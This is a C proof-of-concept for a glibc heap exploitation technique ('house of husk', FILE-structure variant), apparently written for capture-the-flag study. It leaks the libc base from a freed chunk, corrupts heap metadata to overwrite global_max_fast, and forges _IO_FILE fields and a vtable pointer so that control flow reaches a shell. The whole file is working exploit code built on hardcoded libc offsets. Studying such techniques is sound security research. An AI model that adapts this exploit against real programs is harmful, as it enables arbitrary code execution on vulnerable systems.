// gcc poc.c -o poc -no-pie -g
// This is based on house of husk
// https://ptr-yudai.hatenablog.com/entry/2020/06/07/202053#Pwn-298pts-Error-Program

/*
fp->_flags = 0
fp->_IO_write_base = 0
fp->_IO_write_ptr = addr_rdx
fp->_IO_buf_base = 0
fp->_IO_buf_end = (addr_rdi - 100) / 2
fp->_mode = 0
vtable = addr_IO_str_jumps
*/

#include <stdio.h>
#include <stdlib.h>

#define offset2size(ofs) ((ofs) * 2 - 0x10)
#define MAIN_ARENA       0x3ebc40
#define MAIN_ARENA_DELTA 0x60
#define GLOBAL_MAX_FAST  0x3ed940
#define PRINTF_FUNCTABLE 0x3f0658
#define PRINTF_ARGINFO   0x3ec870
#define ONE_GADGET       0x10a38c

int main (void)
{
  unsigned long libc_base;
  char *a[10];

  a[0] = malloc(0x3880);
  a[1] = malloc(0x1430);
  free(a[0]);
  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;
  // printf("libc @ 0x%lx\n", libc_base);

  *(unsigned long*)(a[1] + 0x18) =  0xffffffffffffffff;  // write_base
  *(unsigned long*)(a[1] + 0x30) =  (libc_base + (1785498 - 100)) / 2; // _IO_buf_end
  // (bin_sh - 100) / 2 = _IO_buf_end - _IO_buf_base

  *(unsigned long*)(a[1] + 0xb0) = 0xffffffff;
  
  *(unsigned long*)(a[1] + 0xc8) = libc_base + 0x3e8360 - 0x40;
  *(unsigned long*)(a[1] + 0xd0) = libc_base + 0x4f440;

  *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;

  a[2] = malloc(0x3880);

  free(a[1]);
  free(a[2]);

}
